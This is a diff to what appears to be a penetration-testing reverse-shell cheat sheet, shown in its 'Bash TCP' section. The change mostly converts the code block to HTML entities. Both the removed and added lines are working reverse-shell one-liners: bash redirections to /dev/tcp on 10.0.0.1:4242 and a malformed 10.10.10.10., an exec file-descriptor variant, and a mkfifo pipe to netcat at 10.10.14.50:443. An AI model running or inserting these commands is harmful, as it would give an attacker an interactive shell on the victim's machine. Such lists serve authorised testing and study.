@@ -15,15 +15,15 @@ impacket-smbserver share .
 
 ### Bash TCP
 
-```bash
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+<pre class="language-bash"><code class="lang-bash">bash -c 'bash -i >&#x26; /dev/tcp/10.10.10.10./443 0>&#x26;1'
 
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+bash -i >&#x26; /dev/tcp/10.0.0.1/4242 0>&#x26;1
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc 10.10.14.50 443 >/tmp/f
-
-/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
-```
+0&#x3C;&#x26;196;exec 196&#x3C;>/dev/tcp/10.0.0.1/4242; sh &#x3C;&#x26;196 >&#x26;196 2>&#x26;196
+<strong>
+</strong><strong>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&#x26;1|nc 10.10.14.50 443 >/tmp/f
+</strong>
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0&#x3C;&#x26;1 2>&#x26;1</code></pre>
 
 ### Bash UDP
 
